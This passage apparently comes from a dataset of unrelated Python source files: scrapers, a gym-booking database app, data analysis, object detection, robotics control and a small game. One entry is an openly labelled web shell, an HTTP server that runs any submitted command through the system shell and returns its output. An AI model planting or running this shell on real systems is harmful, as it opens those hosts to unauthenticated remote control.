1).min().to_frame('ll034').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['h'].rolling(34, 1).max().to_frame('hh034').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['l'].rolling(65, 1).min().to_frame('ll065').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['h'].rolling(65, 1).max().to_frame('hh065').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['c'].rolling(40, 1).mean().to_frame('MA040').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    cond_minvol = (df_combined['v'] > 100000)\n    cond_vol = (df_combined['v'] > df_combined['pv'])\n    cond_liquid = (df_combined['dolvol020'] >= 250000)\n    con_minprice = (df_combined['pc020'] >= 5)\n\n    df_combined['t2108'] = (df_combined['c'] > df_combined['MA040']).astype(int)\n\n    df_combined['IsUp4Pct'] = ((df_combined['PctChange'] >= 0.04) & (cond_minvol) & (cond_vol)).astype(int)\n    df_combined['IsDn4Pct'] = ((df_combined['PctChange'] <= -0.04) & (cond_minvol) & (cond_vol))",
    "#<----------------- DATABASE CONNECTION FUNCTIONS ----------------->\n\nimport psycopg2\nfrom psycopg2 import Error\nimport random\nfrom tabulate import tabulate\n\n# Database connection parameters\nDB_NAME = \"#YOUR DATABASE NAME#\"    \nDB_USER = \"#YOUR DATABASE USER#\"\nDB_PASSWORD = \"#YOUR PASSWORD TO CONNECT TO DATABASE#\"\nDB_HOST = \"localhost\"\nDB_PORT = \"5432\"\n\ndef connect():\n    try:\n        connection = psycopg2.connect(\n            user=DB_USER,\n            password=DB_PASSWORD,\n            host=DB_HOST,\n            port=DB_PORT,\n            database=DB_NAME\n        )\n        return connection\n    except Error as e:\n        print(\"Error while connecting to PostgreSQL:\", e)\n\n#<----------------- MEMBER FUNCTIONS ----------------->\n\ndef displayMemberDashboard(name, memberID):\n    menu = [\n        \"1. Update profile information\",\n        \"2. View Profile Information\",\n        \"3. Manage Schedules\",\n        \"4. View Upcoming Schedules\",\n        \"5. RECOMMENDED CLASSES!!!\",\n        \"6. Logout\"\n    ]\n    print(f\"\\nWelcome Member {name}!\")\n    print(\"\\nWhat would you like to do?\")\n    print(\"\\n\".join(menu))\n    choice = input(\"\\nEnter your choice: \")\n    if choice == \"1\":\n        updateProfile(name, memberID)\n    elif choice == \"2\":\n        viewProfile(name, memberID)\n    elif choice == \"3\":\n        manageSchedules(name, memberID)\n    elif choice == \"4\":\n        viewSchedules(name, memberID)\n    elif choice == \"5\":\n        viewRecommendedClasses(name, memberID)\n    elif choice == \"6\":\n        main()\n    else:\n        print(\"\\nInvalid choice. Please try again.\\n\")\n        displayMemberDashboard(name, memberID)\n\ndef viewRecommendedClasses(name, memberID):\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT ClassID FROM Fitness_Class;\")\n    possibleID = cursor.fetchall()\n    randomIndex = random.randint(0, len(possibleID) - 1)\n    if possibleID:\n        cursor.execute(\"SELECT ClassName, Schedule, RoomID, TrainerID FROM Fitness_Class WHERE ClassID = %s;\", (possibleID[randomIndex][0],))\n        recommended = cursor.fetchone()\n        print(\"Recommended class:\")\n        headers = [\"Class Name\", \"Schedule\", \"Room ID\", \"Trainer ID\"]\n        print(tabulate([headers, recommended], headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No recommended classes.\")\n    cursor.close()\n    connection.close()\n    displayMemberDashboard(name, memberID)\n\ndef viewSchedules(name, memberID):\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT SessionID, Date, Time, TrainerID FROM Training_Session WHERE MemberID = %s;\", (memberID,))\n    sessions = cursor.fetchall()\n    if sessions:\n        print(\"\\nUpcoming Training sessions:\")\n        headers = [\"Session ID\", \"Date\", \"Time\", \"Trainer ID\"]\n        print(tabulate([headers] + sessions, headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No upcoming Training sessions.\")\n    \n    cursor.execute(\"\"\"SELECT FC.ClassID, FC.ClassName, FC.Schedule, FC.RoomID, FC.TrainerID \n                      FROM Fitness_Class FC \n                      JOIN Registers R ON FC.ClassID = R.ClassID \n                      WHERE R.MemberID = %s;\"\"\", (memberID,))\n    classes = cursor.fetchall()\n    if classes:\n        print(\"\\nUpcoming Group Fitness Classes:\")\n        headers = [\"Class ID\", \"Class Name\", \"Schedule\", \"Room ID\", \"Trainer ID\"]\n        print(tabulate([headers] + classes, headers=\"firstrow\", tablefmt=\"grid\"))\n    else:\n        print(\"No upcoming Group Fitness Classes.\")\n    cursor.close()\n    connection.close()\n    displayMemberDashboard(name, memberID)\n\ndef manageSchedules(name, memberID):\n    menu = [\n        \"1. Schedule personal training session\",\n        \"2. Schedule group fitness class\",\n        \"3. Reschedule personal training session\",\n        \"4. Cancel personal training session\",\n        \"5. Cancel group fitness class\"\n    ]\n    print(\"\\nWhat would you like to do?\")\n    print(\"\\n\".join(menu))\n    choice = input(\"\\nEnter your choice: \")\n    connection = connect()\n    cursor = connection.cursor()\n    if choice == \"1\":\n        print(\"\\nBelow are the available training sessions:\")\n        cursor.execute(\"\"\"\n            SELECT t.TrainerID, t.Name, t.Specialization, t.AvailableTimes\n            FROM Trainer t\n            LEFT JOIN Training_Session ts ON t.TrainerID = ts.TrainerID\n            WHERE ts.TrainerID IS NULL;\n        \"\"\")\n        sessions = cursor.fetchall()\n        if sessions:\n            for session in sessions:\n                print(session)\n            trainerID = input(\"Enter ID of the trainer you want to schedule a session with: \")\n            date = input(\"Enter date of session: \")\n            time = input(\"Enter time of session: \")\n            cursor.execute(\"INSERT INTO Training_Session (Date, Time, MemberID, TrainerID) VALUES (%s, %s, %s, %s);\", (date, time, memberID, trainerID))\n            connection.commit()\n            print(\"Session scheduled successfully.\")\n        else:\n            print(\"No t",
    "import logging\r\nimport time\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom selenium.webdriver.chrome.options import Options\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\n\r\n# Set up logging to suppress console logs\r\nlogging.getLogger('selenium').setLevel(logging.WARNING)\r\n\r\n# Set up Chrome options\r\nchrome_options = Options()\r\nchrome_options.add_argument(\"--headless\")\r\nchrome_options.add_argument(\"--log-level=3\")\r\nchrome_options.add_argument(\"--disable-blink-features=AutomationControlled\")\r\n# Run in headless mode (without opening a browser window)\r\n\r\n# Create a Service object with WebDriverManager to automatically manage the ChromeDriver binary\r\nchrome_service = Service(ChromeDriverManager().install())\r\n\r\n# Create a Chrome driver instance with the specified options and service\r\ndriver = webdriver.Chrome(service=chrome_service, options=chrome_options)\r\n\r\n# Navigate to the website\r\ndriver.get(\"https://tts.5e7en.me/\")\r\n\r\ndef speak(text):\r\n    try:\r\n        # Wait for the element to be clickable\r\n        element_to_click = WebDriverWait(driver, 10).until(\r\n            EC.element_to_be_clickable((By.XPATH, '//*[@id=\"text\"]'))\r\n        )\r\n\r\n        # Perform the click action\r\n        element_to_click.click()\r\n\r\n        # Input text into the element\r\n        text_to_input = text\r\n        element_to_click.send_keys(text_to_input)\r\n        print(text_to_input)\r\n\r\n        # Calculate sleep duration based on sentence length\r\n        sleep_duration = min(0.2 + len(text) // 10,15)  # Minimum sleep is 3 seconds, maximum is 10 seconds\r\n\r\n        # Wait for the button to be clickable\r\n        button_to_click = WebDriverWait(driver, 10).until(\r\n            EC.element_to_be_clickable((By.XPATH, '//*[@id=\"button\"]'))\r\n        )\r\n\r\n        # Perform the click action on the button\r\n        button_to_click.click()\r\n\r\n        # Sleep for dynamically calculated duration\r\n        time.sleep(sleep_duration)\r\n\r\n        # Clear the text box for the next sentence\r\n        element_to_click.clear()\r\n\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n\r\n\r\n",
    "import pandas as pd\nimport xml.etree.ElementTree as ET\nimport matplotlib\nmatplotlib.use('TkAgg')\nimport seaborn as sns\nimport matplotlib.pyplot as plt\nimport nltk\nfrom nltk.corpus import stopwords\nfrom nltk.tokenize import word_tokenize\nfrom nltk.stem import PorterStemmer\n\nnltk.download('stopwords')\nnltk.download('punkt')\n\ntree = ET.parse('Dataset/post.xml')\n\n# Names of the XML data fields\nfields = ['id', 'PostTypeId', 'ParentId', 'AcceptedAnswerId', 'CreationDate',\n          'Score', 'ViewCount', 'Body', 'OwnerUserId', 'LastEditorUserId',\n          'LastEditorDisplayName', 'LastEditDate', 'LastActivityDate', 'Title',\n          'Tags', 'AnswerCount', 'CommentCount', 'FavoriteCount', 'CommunityOwnedDate']\n\n# Initialize dictionary with empty lists\ndata = {field: [] for field in fields}\n\nfor post in tree.getroot().findall('row'):\n    for field in fields:\n        data[field].append(post.get(field))\n\ndf = pd.DataFrame(data)\n\n# Columns to remove\nremove_cols = ['AcceptedAnswerId','OwnerUserId', 'LastEditorUserId',\n               'LastEditorDisplayName','LastEditDate', 'LastActivityDate', 'CommunityOwnedDate']\ndf.drop(columns=remove_cols, inplace=True)\n\ndf['CreationDate'] = pd.to_datetime(df['CreationDate'])\ndf_question = df.loc[df['PostTypeId'] == '1'].copy().drop(columns=['PostTypeId', 'ParentId'])\ndf_question['BodyLength'] = df_question['Body'].str.len()\ndf_question['TitleLength'] = df_question['Title'].str.len()\n\ncolumns_to_convert = ['id','Score', 'ViewCount', 'AnswerCount', 'CommentCount', 'FavoriteCount']\n\nfor col in columns_to_convert:\n    df_question[col] = df_question[col].fillna(0).astype(int)\n\ndef clean_tags(tags_string):\n    return tags_string.replace('><', ' ').replace('<', '').replace('>', '').replace('-', ' ')\n\ndf_question['Cleaned_Tags'] = df_question['Tags'].apply(clean_tags)\n\n# Word count function\ncount_words = lambda sentence: len(sentence.split())\n\ndf_question['tags'] = df_question['Cleaned_Tags'].apply(count_words)\n\nstop_words = set(stopwords.words('english'))\nps = PorterStemmer()\n\ndef similarity(query, document):\n    result = []\n    for q, d in zip(query, document):\n        filtered_query = [ps.stem(w) for w in word_tokenize(q) if not w.lower() in stop_words]\n        filtered_document = [ps.stem(w) for w in word_tokenize(d) if not w.lower() in stop_words]\n        intersection = set(filtered_query) & set(filtered_document)\n        result.append(len(intersection) / len(set(filtered_query)) * 100)\n    return result\n\ndf_question['sim_Tags_Body'] = similarity(df_question['Cleaned_Tags'].str.lower(), df_question['Body'].str.lower())\n\ncolumn_to_ignore = ['id', 'CreationDate','Body','Title','Cleaned_Tags']\n\nnumeric_df_question = df_question.drop(columns=column_to_ignore).drop('Tags', axis=1)\n\ncorrelation_matrix = numeric_df_question.corr()\n\nfig = plt.figure()\nfig.patch.set_facecolor('None')\nheatmap = sns.heatmap(correlation_matrix, annot=True, cmap='coolwarm', fmt='.2f')\nplt.title('Correlation Heatmap (Questions)')\nheatmap.patch.set_facecolor('None')\nheatmap.patch.set_alpha(0.1)\nplt.figure(figsize=(12,10))  # adjust the size of the plot\nsns.set(font_scale=1.2)  # scale the font for better visualization\n\ncorrelation_matrix = numeric_df_question.corr()\n\nheatmap = sns.heatmap(correlation_matrix, annot=True, cmap='coolwarm', fmt='.2f', linewidths=.05)\nheatmap.set_title('Correlation Heatmap (Questions)', fontdict={'fontsize':18}, pad=16)\n\nplt.xticks(rotation=90)\nplt.yticks(rotation=0)\n\nplt.savefig('heatmap.png', dpi=1200, bbox_inches='tight')\n",
    "\"\"\"\nBuilds area code database from scraping NANPA\nStores data into an sqlite database\n\"\"\"\n\nimport os\nimport logging\nimport time\nimport sqlite3\n\nimport json\nimport openai\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom dotenv import load_dotenv\n\n# Configure logging\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n\ndef navigate_to_search_page(driver: any):\n    try:\n        # Navigate to the main page\n        driver.get(\"https://www.nationalnanpa.com/tools/index.html\")\n\n        # Find the \"Area Code Search\" link and click on it\n        search_link = WebDriverWait(driver, 10).until(\n            EC.presence_of_element_located((By.LINK_TEXT, \"Area Code Search\"))\n        )\n        search_link.click()\n\n        logging.info(\"Navigated to the search page\")\n    except Exception as err:\n        logging.error(\"Error occurred while navigating to the search page\")\n        logging.error(err)\n        raise\n\ndef search_area_code(driver: any, area_code: str) -> tuple[bool, str, str, bool]:\n    # bool to return\n    code_used = False\n    # location\n    code_location = \"\"\n    # country\n    code_country = \"\"\n    # assignable\n    code_assignable = False\n\n    try:\n        # Find the form elements\n        npa_input = WebDriverWait(driver, 10).until(\n            EC.presence_of_element_located((By.ID, \"npaValue\"))\n        )\n        submit_button = WebDriverWait(driver, 10).until(\n            EC.element_to_be_clickable((By.CSS_SELECTOR, \"input[type='submit']\"))\n        )\n\n        # Fill in the area code and submit the form\n        npa_input.clear()\n        npa_input.send_keys(area_code)\n        submit_button.click()\n\n       # Wait for the results page to load\n        WebDriverWait(driver, 10).until(\n            EC.presence_of_element_located((By.TAG_NAME, \"body\"))\n        )\n\n        # Get the HTML content of the page body\n        html_content = driver.find_element(By.TAG_NAME, \"body\").get_attribute(\"outerHTML\")\n\n        logging.info(f\"Successfully body data for area code: {area_code}\")\n        logging.info(f\"Sending body HTML to LLM for interpretation\\n\")\n\n        # send to local llm to get table data\n        try:\n            oai_client = openai.OpenAI(api_key=os.environ.get(\"OPENAI_API_KEY\"))\n\n            prompt_content = f\"\"\"\nUsing the HTML website content provided, produce a JSON ONLY about the area code {area_code}. If there is no infomation, return an empty JSON.\n\nIf you cannot figure out how to extract the data create a JSON with a reason attribute and the value with the reason\n\nRETURN ONLY JSON. RETURN JSON THAT WILL NOT CAUSE AN ERROR WITH PYTHON JSON MODULE. NO MARKDOWN\n\nFOLLOW THIS EXAMPLE'S FORMAT\n\"\"\"\n            prompt_content += \"\"\"\n{ \n    \"area_code\": 200,\n    \"general_information\": {\n        \"type_of_code\": \"Easily Recognizable Code\",\n        \"assignable\": \"Yes\",\n        \"geographic_or_non_geographic\": \"Non-geographic (N)\",\n        \"code_reserved_for_future_use\": \"No\",\n        \"code_assigned\": \"No\",\n        \"code_in_use\": \"No\"\n    },\n    \"geographic_information\": {\n        \"location\": \"\",\n        \"country\": \"\",\n        \"time_zone\": \"\",\n        \"parent_npa\": \"\",\n        \"overlay_code\": \"\",\n        \"overlay_complex\": \"\",\n        \"jeopardy\": \"\",\n        \"relief_planning_in_progress\": \"No\"\n    }\n}\n\"\"\"\n            prompt_content += f\"HTML Content:\\n{html_content}\"\n\n            llm_comp = oai_client.chat.completions.create(\n                model=\"gpt-3.5-turbo\",\n                messages=[\n                    {\n                        \"role\": \"system\",\n                        \"content\": \"You are a professional Data Scientist named AreaCoder\"\n                    },\n                    {\n                        \"role\": \"user\",\n                        \"content\": prompt_content\n                    }\n                ]\n            )\n\n            llm_resp = llm_comp.choices[0].message.content\n            logging.info(f\"llm_resp\\n{llm_resp}\")\n            try:\n                zip_json_data = json.loads(llm_comp.choices[0].message.content)\n            except json.JSONDecodeError as err:\n                logging.error(f\"json error: {err}\")\n                logging.info(f\"Retrying with {area_code}\")\n                return search_area_code(driver, area_code)\n\n            if zip_json_data:\n                gen_info = zip_json_data[\"general_information\"]\n                geo_info = zip_json_data[\"geographic_information\"]\n\n                code_assignable = True if gen_info[\"assignable\"] == \"Yes\" else False\n                ciu = gen_info[\"code_in_use\"]\n                code_used = False if ciu == \"N\" or ciu == \"No\" else True\n                code_location = geo_info[\"location\"] if geo_info[\"location\"] else \"\"\n                code_country = geo_info[\"country\"] if geo_info[\"country\"] else \"\"\n\n        except Exception as err:\n            logging.error(f\"OPENAI",
    "import csv\nimport json\nimport requests\nimport sys\n\n\ndef main():\n\n\n    # Wyszukiwanie tematu\n    wyszukiwanie = input(\"Szukaj tematu: \").lower()\n    wynik = wyszukiwarka(wyszukiwanie)\n    if len(wynik) < 1:\n        print(\"Nie znaleziono.\")\n    else:\n        for count, item in enumerate(wynik):\n            print(f\"{count + 1}. {item}\")\n            \n\n    # Wyb\u00f3r tematu z listy wynik\u00f3w\n    wybor = input(\"Wybierz numer z listy: \")    \n    while True:\n        try:\n            wybor = int(wybor)\n            if wybor in range(1, len(wynik) + 2):\n                print(wynik[wybor - 1])\n                id_zpo = (pobierz_id(wynik[wybor - 1]))\n                break\n        except ValueError:\n            print(\"Nieprawid\u0142owa warto\u015b\u0107.\")\n            break\n\n\n    try:\n        rok = int(input(\"Podaj rok: \"))\n    except ValueError:\n        sys.exit(\"Podaj czterocyfrow\u0105 liczb\u0119\")\n            \n    zapytanie = requests.get(f\"https://api-dbw.stat.gov.pl/api/1.1.0/variable/variable-data-section?id-zmienna={id_zpo[0]}&id-przekroj={id_zpo[1]}&id-rok={rok}&id-okres={id_zpo[2]}&ile-na-stronie=500&numer-strony=0&lang=pl\")\n\n    zapytanie = zapytanie.json()\n    print(json.dumps(zapytanie, indent=2))\n    sys.exit()\n\n\n    \n    \n# Wyszukiwarka zmiennych po stringach, pobiera nazwy z API, ale mog\u0142aby te\u017c z pliku gus_zmienne.csv\n# Obecnie wyniki nie s\u0105 sortowane, ale mog\u0105 by\u0107\ndef wyszukiwarka(string):\n    tematy = set()\n    znalezione = []\n    page = 0\n    while page <= 1:\n        zmienne = requests.get(f\"https://api-dbw.stat.gov.pl/api/1.1.0/variable/variable-section-periods?ile-na-stronie=5000&numer-strony={page}&lang=pl\")\n        for row in zmienne.json()[\"data\"]:\n            nazwa = str(row['nazwa-zmienna'])\n            tematy.add(nazwa)\n        page += 1\n\n    for temat in tematy:\n        check = temat.lower().find(string)\n        if check != -1:\n            znalezione.append(temat)\n    return znalezione\n\n\ndef pobierz_id(nazwa):\n    ids = []\n    with open(\"gus_zmienne.csv\", \"r\", encoding=\"utf-8\") as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            if row[\"nazwa-zmienna\"] == nazwa:\n                ids.append(int(row[\"id-zmienna\"]))\n                ids.append(int(row[\"id-przekroj\"]))\n                ids.append(int(row[\"id-okres\"]))\n                return ids\n    \n\nif __name__ == \"__main__\":\n    main()",
    "import requests\nfrom bs4 import BeautifulSoup\nimport csv\nimport psycopg2\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'\n}\n\npage = requests.get('https://www.inam.tg/remboursement-produits-pharmaceutiques/', headers=headers)\nsoup = BeautifulSoup(page.text, 'html.parser')\n\nmodals = soup.find_all(class_=\"modal\")\nmedicaments = []\ni=1\nfor modal in modals:\n    medicament = {}\n    medicament['id'] = i\n\n    # r\u00e9cup\u00e9ration du nom du m\u00e9dicament et du dosage\n    ligne_dosage = modal.select('.row:nth-child(0n+2)')\n    dosage_raw_text = ligne_dosage[0].find(class_='col-md-6').find('p').text.replace('Dosage: ', '')\n    medicament_raw_name = modal.find(class_=\"modal-header\").text.replace('x', '').replace('\\n', '')[:-1]\n    medicament['nom'] = medicament_raw_name.strip('x').replace('\"', '') + ' ' + dosage_raw_text.replace('\"', '')\n    medicament['dosage'] = dosage_raw_text.replace('\"', '')\n\n    # groupe th\u00e9rapeutique du m\u00e9dicament\n\n    ligne_groupe_therapeutique = modal.select('.row:nth-child(0n+3)')\n    groupe_therapeutique_raw_text = ligne_groupe_therapeutique[0].find(class_='col-md-6').find('p').text.replace('Groupe Therapeutique: ', '')\n    medicament['therapie'] = groupe_therapeutique_raw_text\n\n    # forme du m\u00e9dicament\n    ligne_forme = modal.select('.row:nth-child(0n+4)')\n    forme_raw_text = ligne_forme[0].find_all(class_='col-md-6')[1].find('p').text.replace('Forme: ', '')\n    medicament['forme'] = forme_raw_text\n\n    # prix du m\u00e9dicament\n    ligne_prix = modal.select('.row:nth-child(0n+5)')\n    prix_raw_text = ligne_prix[0].find_all(class_='col-md-6')[1].find('span', class_='badge').text.replace(' FCFA', '')\n    medicament['prix'] = float(prix_raw_text)\n\n    # quantit\u00e9e dans l'emballage\n    ligne_qte = modal.select('.row:nth-child(0n+1)')\n    qte_raw_text = ligne_qte[0].find_all(class_='col-md-6')[0].find('p').text.replace('Quantit\u00e9: ', '')\n    medicament['quantite'] = qte_raw_text\n\n    # prix de base de remboursement inam\n    ligne_prix_inam = modal.select('.row:nth-child(0n+6)')\n    prix_inam_raw_text = ligne_prix_inam[0].find_all(class_='col-md-6')[0].find('p').text.replace('Base Remboursement: ', '')\n    medicament['prix_inam'] = float(prix_inam_raw_text)\n    medicaments.append(medicament)\n    i += 1\nprint('donn\u00e9es r\u00e9cup\u00e9r\u00e9es')\n\n\n# enregistrement des donn\u00e9es dans un fixhier csv\ncsv_file = open('drugs_csv.csv', 'w', encoding='utf-8', newline='')\nwriter = csv.writer(csv_file)\n\nwriter.writerow(['id', 'nom', 'dosage', 'therapie', 'forme', 'prix', 'quantite', 'prix_inam'])\nfor medicament in medicaments:\n     writer.writerow(medicament.values())\n\ncsv_file.close()\n\n\n\n# enregistrement des donn\u00e9es dans une base postgreSQL\n\n\nj=1\ntotal= len(medicaments)\nconn = psycopg2.connect(database=\"xxxxxxx\", user=\"xxxxxxx\", password=\"xxxxxx\", host=\"xxxxxxxxx\", port=\"5432\")\ncur = conn.cursor()\nfor medicament in medicaments:\n    j += 1\n    cur.execute('insert into drugs (name, price, price_inam, shape, quantity, dosage, therapy) values (%(name)s, %(price)s, %(price_inam)s, %(shape)s, %(quantity)s, %(dosage)s, %(therapy)s)',{'name': medicament['nom'],'price': medicament['prix'], 'price_inam': medicament['prix_inam'], 'shape': medicament['forme'], 'quantity': medicament['quantite'], 'dosage': medicament['dosage'], 'therapy': medicament['therapie']} )\n    pourcentage = (j/total) * 100\n    print('pourcentage: ' + str(round(pourcentage, 2)) + '%')\n\nconn.commit()\ncur.close()\nconn.close()\n",
    "import os\nimport cv2\nimport numpy as np\nfrom matplotlib import pyplot as plt\nimport tensorflow as tf\nfrom object_detection.utils import label_map_util\nfrom object_detection.utils import visualization_utils as viz_utils\nfrom load_model import detect_fn\n\nIMAGES_NAMES = [\"true-01\", \"true-02\", 'true-03', 'true-04', 'true-05', \"false-01\", \"false-02\", 'false-03', 'false-04', 'false-05']\n\nfor IMAGE_NAME in IMAGES_NAMES: \n\tIMAGE_PATH = os.path.join(\"images\", \"evaluation\", f\"{IMAGE_NAME}.jpg\")\n\n\tcategory_index = label_map_util.create_category_index_from_labelmap(\"label_map.pbtxt\")\n\n\timage = cv2.imread(IMAGE_PATH)\n\timage_np = np.array(image)\n\n\tinput_tensor = tf.convert_to_tensor(np.expand_dims(image_np, 0), dtype=tf.float32)\n\tdetections = detect_fn(input_tensor)\n\n\tnum_detections = int(detections.pop('num_detections'))\n\tdetections = {\n\t\tkey: value[0, :num_detections].numpy() for key, value in detections.items()\n\t}\n\n\tdetections['detection_classes'] = detections['detection_classes'].astype(np.int64)\n\n\tstrawberry_indices = np.where(detections['detection_classes'] == 0)[0]\n\tstrawberry_boxes = detections['detection_boxes'][strawberry_indices]\n\tstrawberry_scores = detections['detection_scores'][strawberry_indices]\n\n\tlabel_id_offset = 1\n\timage_np_with_detections = image_np.copy()\n\n\tviz_utils.visualize_boxes_and_labels_on_image_array(\n\t\timage_np_with_detections,\n\t\tstrawberry_boxes,\n\t\tdetections['detection_classes'][strawberry_indices] + label_id_offset,\n\t\tstrawberry_scores,\n\t\tcategory_index,\n\t\tuse_normalized_coordinates=True,\n\t\tmax_boxes_to_draw=5,\n\t\tmin_score_thresh=0.5,\n\t\tagnostic_mode=False\n\t)\n\n\t# final_image = cv2.cvtColor(image_np_with_detections, cv2.COLOR_RGB2BGR)\n\tcv2.imwrite(os.path.join(\"images\", \"evaluation\", f\"{IMAGE_NAME}-detected.png\"), image_np_with_detections)\n",
    "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport subprocess\n\nclass WebShellHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n        self.wfile.write(b'''\n            <html>\n            <head><title>Python Web Shell</title></head>\n            <body>\n            <h1>Python Web Shell</h1>\n            <form method=\"post\" action=\"/\">\n                <label for=\"command\">Enter command:</label><br>\n                <input type=\"text\" id=\"command\" name=\"command\"><br>\n                <input type=\"submit\" value=\"Execute\">\n            </form>\n            </body>\n            </html>\n        ''')\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode('utf-8')\n        command = post_data.split(\"=\")[1].replace(\"+\", \" \")\n        try:\n            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(result)\n        except Exception as e:\n            self.send_response(500)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write((\"Error: \" + str(e)).encode('utf-8'))\n\ndef run(server_class=HTTPServer, handler_class=WebShellHandler, port=8000):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print('Starting Python Web Shell...')\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        print('Stopping Python Web Shell...')\n        httpd.server_close()\n\nif __name__ == '__main__':\n    run()\n",
    "\nfrom pydrake.systems.framework import LeafSystem, Context\nfrom pydrake.common.value import AbstractValue\n\nimport numpy as np\nimport pygame\nimport time\n\nclass WalkingTargetValue():\n    def __init__(self) -> None:\n        self.des_x_y_yaw_vel = np.zeros(3)\n        self.start_stop_stepping = False\n        self.kill = False\n\nclass WalkingTarget(LeafSystem):\n    def __init__(self):\n        LeafSystem.__init__(self)\n        self.target_value = WalkingTargetValue()\n        self.target_value_out = self.DeclareAbstractOutputPort('target_value_out',lambda: AbstractValue.Make(WalkingTargetValue()),self.CalcOutput)\n\n    def CalcOutput(self,context: Context,output: AbstractValue):\n        output.set_value(self.target_value)\n        return\n    \nclass JoystickInputSettings():\n    def __init__(self, x_y_yaw_offset = np.zeros(3), x_y_yaw_scale = np.ones(3), alpha_filt = 0.0):\n        self.x_y_yaw_offset = x_y_yaw_offset\n        self.x_y_yaw_scale = x_y_yaw_scale\n        self.alpha_filt = alpha_filt\n\n    def OverwriteFromDict(self, config_dict:dict):\n        if config_dict.__contains__('x_y_yaw_offset'):\n            self.x_y_yaw_offset = config_dict['x_y_yaw_offset']\n        if config_dict.__contains__('x_y_yaw_scale'):\n            self.x_y_yaw_scale = config_dict['x_y_yaw_scale']\n        if config_dict.__contains__('alpha_filt'):\n            self.alpha_filt = config_dict['alpha_filt']\n\nclass JoystickInput(WalkingTarget):\n    def __init__(self, settings:JoystickInputSettings=None, config_dict:dict=None): \n        WalkingTarget.__init__(self)\n\n        self.settings = settings\n        if self.settings is None:\n            self.settings = JoystickInputSettings()\n        if config_dict is not None:\n            self.settings.OverwriteFromDict(config_dict)\n\n        pygame.init()\n        if pygame.joystick.get_count() > 0:\n            self.js = pygame.joystick.Joystick(0)\n        else:    \n            self.js = None\n\n    def CalcOutput(self,context: Context,output: AbstractValue):\n        if self.js is None and pygame.joystick.get_count() > 0:\n            self.js = pygame.joystick.Joystick(0)\n        if self.js is not None:\n            pygame.event.get()\n            if self.js.get_button(0):\n                self.target_value.start_stop_stepping = True\n            else:\n                self.target_value.start_stop_stepping = False\n            if self.js.get_button(2):\n                self.target_value.kill = True\n\n            des_x_y_vel_unfilt = np.multiply(self.settings.x_y_yaw_scale,np.array([self.js.get_axis(1),self.js.get_axis(0),self.js.get_axis(3)])) + self.settings.x_y_yaw_offset\n            self.target_value.des_x_y_yaw_vel = self.settings.alpha_filt*self.target_value.des_x_y_yaw_vel + (1.-self.settings.alpha_filt)*des_x_y_vel_unfilt\n        # print(vars(self.target_value))\n        output.set_value(self.target_value)\n        return",
    "import pydub as pd\nimport os\nimport time as t\nos.system(\"Color a\")\nos.system(\"CLS\")\n\ndef gameover():\n    #? gameover_theme = pd.AudioSegment.from_mp3(\"\")\n    print(\"\"\" \n    ######################################################\n    #                                                    #\n    #                                                    #\n    #                                                    #\n    #   ____                                             #\n    #  / ___| __ _ _ __ ___   ___    _____   _____ _ __  #\n    # | |  _ / _` | '_ ` _ \\ / _ \\  / _ \\ \\ / / _ \\ '__| #\n    # | |_| | (_| | | | | | |  __/ | (_) \\ V /  __/ |    #\n    #  \\____|\\__,_|_| |_| |_|\\___|  \\___/ \\_/ \\___|_|    #\n    #                                                    #\n    #                                                    #  \n    #                                                    #\n    ######################################################\n    \"\"\")\n\n#? music department\n#? scary_sound = pd.AudioSegment.from_mp3(\"./scary.mp3\")\n\n#TODO 5 artefakt\u016f k otev\u0159en\u00ed petrovy kapsy, k z\u00edsk\u00e1n\u00ed karty ke kouzeln\u00fdm dve\u0159\u00edm. Otev\u00edr\u00e1n\u00ed ve tvaru pentagramu. 5 PC (ka\u017ed\u00e9mu chyb\u00ed n\u011bco jin\u00e9ho)\n#TODO Artefakty: Honz\u016fv kabel, instala\u010dn\u00ed soubory LabView, Pepovu raketu (a naistalovat nan\u00ed win11), pojistku, p\u0159ihla\u0161ovac\u00ed \u00fadaje k nov\u00fdm PC na TULce\n#TODO good endings: probuzen\u00ed ze snu\n#TODO bad endings: p\u0159ejet\u00ed vlakem po vyjit\u00ed z budovy\n#TODO items: Kafe / Honzovo kafe (nicked), tvoje zapomenut\u00e9 USB\n#TODO LV: nasel jsi svoje stare USB se soubory 